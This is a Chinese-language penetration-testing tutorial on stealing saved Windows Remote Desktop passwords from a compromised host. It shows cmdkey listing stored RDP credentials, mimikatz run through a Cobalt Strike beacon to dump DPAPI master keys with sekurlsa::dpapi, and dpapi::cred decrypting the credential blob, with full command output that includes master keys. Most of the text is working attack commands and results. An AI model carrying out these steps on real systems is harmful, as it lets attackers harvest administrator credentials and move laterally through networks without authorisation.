# 内网渗透之获取windows远程桌面（RDP）连接记录

利用条件：就是mstsc连接的时候，管理员勾选了自动保存密码连接的选项。

目标ip：172.xx.x.1
被控制ip:172.xx.x.12

在172.18.x.12中执行

```
C:\Users\Administrator>cmdkey /list

```

```
当前保存的凭据:

    目标: LegacyGeneric:target=TERMSRV/172.xx.x.1
    类型: 普通
    用户: I3L2JDBDV6JENUP\Administrator
    本地机器持续时间

    目标: LegacyGeneric:target=TERMSRV/xxxxx.xxxx.org
    类型: 普通
    用户: administrator
    本地机器持续时间

```

如此可见，此服务器保存了两个连接地址，其中的172.xx.x.1就是我们想要获取到的地址。

## 1、查找本地的Credentials

```
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*

*
 驱动器 C 中的卷是 系统
 卷的序列号是 0000-6B3E

 C:\Users\Administrator\AppData\Local\Microsoft\Credentials 的目录

2018/11/10  14:04    <DIR>          .
2018/11/10  14:04    <DIR>          ..
2018/11/09  17:05               466 92FB159ED290FC523E845094404697A8
2018/11/10  14:04               466 A1EC182214DD58D50DAB9E8850A9E75A
               2 个文件            932 字节
               2 个目录  3,507,884,032 可用字节

```

## 2、使用mimikatz进行操作

```
mimikatz dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\92FB159ED290FC523E845094404697A8

```

![](images/15897832397336.png)


得到内容为：

```
beacon> mimikatz dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\92FB159ED290FC523E845094404697A8
[*] Tasked beacon to run mimikatz's dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\92FB159ED290FC523E845094404697A8 command
[+] host called home, sent: 961605 bytes
[+] received output:
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {9cb35799-f2c5-4897-9d60-3b84331db8ae}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : 本地凭据数据

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 8498307858a1e635b05a9e0dc6256e8ed91216ce3a562e678cc937ad4f9434ba
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 613bfaa4841894899cf3fa3bd34318c0e3ad53e5403c10d126f940c1cd91f510
  dwDataLen          : 000000e0 - 224
  pbData             : 9dd8efd32175a018eef0a0b52c2c082086ec677d2799926b69515b3fcac634ef7b0e1e0f202ba17934d38323e9b068bdef0d08cb3235d5a8efcbb55522f5f1b0f684f216a1a900a6b225863a54395b21dd4fcc699c71f31ba4fcb87292011b29ae12416509590fe30d9440672bb7ad2e02c4d797eef091afc9d48bdaf9d13659f2677b257071ffa60823c32efb2614d0604caaa1e112bef950002249dc555f04662be1ffb2ac0e7a7fb66c52ceb9479fa3150b7495d376627646aa8daaef18345281993db292bf8b39a2049d4b3bc9f914e31f03099677d84d7074b5c146327f
  dwSignLen          : 00000040 - 64
  pbSign             : 1c5d185d5db9a9cdd6e3190d5236f36eddf84b08e3820cbfeff5026e0127adf103eeae501bd7f57003429a4b6ce30d9c3e7a3e16a3ee2b6514e5a631735a8987

```

## 3、使用sekurlsa::dpapi

```
beacon> mimikatz sekurlsa::dpapi
[*] Tasked beacon to run mimikatz's sekurlsa::dpapi command
[+] host called home, sent: 961609 bytes
[+] received output:

Authentication Id : 0 ; 844082 (00000000:000ce132)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SD-201805241744
Logon Server      : SD-201805241744
Logon Time        : 2018/11/29 9:35:37
SID               : S-1-5-21-879709706-2682151700-2389522846-500
     [00000000]
     * GUID      :    {9cb35799-f2c5-4897-9d60-3b84331db8ae}
     * Time      :    2018/12/8 15:37:36
     * MasterKey :    6d3bb90e91c05b6561e9714f37d651c1297a36675299a2172d7bee9e3922dd26842d4b0bf1d246c61d6f1fe845bc48303a8d46138813e9aed552e1919c555561
     * sha1(key) :    d6cf5badd4fd758ac728878b8109ac8b3a6af865
     [00000001]
     * GUID      :    {f9154b95-65a8-498d-9b24-f4c248ba70bb}
     * Time      :    2018/12/11 17:45:59
     * MasterKey :    ec0864068100a6f158e8fa7be7b1e18bdb91cf4baba90d913ca060db56d8ca82c0a643cfd11a8303fbd04b2ad44bf2bbe5c494ee68d35fd7af1127b936c2b5b6
     * sha1(key) :    06a11e1d91806cadbe06f010a0031cdb71ec4346

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2018/11/29 9:16:48
SID               : S-1-5-19

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SD-201805241744$
Domain            : WorkGroup
Logon Server      : (null)
Logon Time        : 2018/11/29 9:16:47
SID               : S-1-5-20

Authentication Id : 0 ; 49720 (00000000:0000c238)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2018/11/29 9:16:46
SID               : 

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SD-201805241744$
Domain            : WorkGroup
Logon Server      : (null)
Logon Time        : 2018/11/29 9:16:46
SID               : S-1-5-18
     [00000000]
     * GUID      :    {e596b8f9-6923-4853-a59c-51d3346000dd}
     * Time      :    2018/11/29 9:16:59
     * MasterKey :    de7a5ebccbeccaa08b4f9daeda81af94daf4ce53b22400bc26c281a68d7081d2a4039f359131890b9089917714b8810b25ec7658fa1e62cc2941630d307b89d4
     * sha1(key) :    929fa099c7c1bf0293da3a9dbefc19ffe1c7d345
     [00000001]
     * GUID      :    {77b81995-c130-478f-a592-7041d039f446}
     * Time      :    2018/11/29 9:59:38
     * MasterKey :    ec6dcf103d177c4e69faac61e182e55d4ee7c6e242d9a5c6a5cde08aa440573155981c91340c4214cbc4911da628a3af2503b82d338b9ab2dee53b33fa044fdc
     * sha1(key) :    dbda555a0e9740db7c61c5ce5880c4baaefdce28
     [00000002]
     * GUID      :    {f1625647-969c-4fff-a63a-f77e4242b229}
     * Time      :    2018/11/29 19:37:12
     * MasterKey :    6ddc8cb28575ddd652fd1c88a9594d3a4a62607959acbf6e3a89e8372d577f6966f3420c47e086ae04e07afd0d778e100bc6408ea374087ee51fced40f5eccde
     * sha1(key) :    b155b36b7f91ea110b42c479a6d40579f3e992ef
     [00000003]
     * GUID      :    {f22e410f-f947-4e08-8f2a-8f65df603f8d}
     * Time      :    2018/11/29 9:16:46
     * MasterKey :    19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa
     * sha1(key) :    b859b2b52e7e49cf5c70069745c88853c4b23487

```

![](images/15897832520238.png)


根据目标凭据

```
GUID: {9cb35799-f2c5-4897-9d60-3b84331db8ae}

```

找到其关联的MasterKey，这个MasterKey就是加密凭据的密钥，即解密pbData所必须的东西。

## 4、解密

命令为：

```
dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\92FB159ED290FC523E845094404697A8 /masterkey:6d3bb90e91c05b6561e9714f37d651c1297a36675299a2172d7bee9e3922dd26842d4b0bf1d246c61d6f1fe845bc48303a8d46138813e9aed552e1919c555561

```

随即即可获取到密码

![](images/15897832590546.png)


![](images/15897832620436.png)


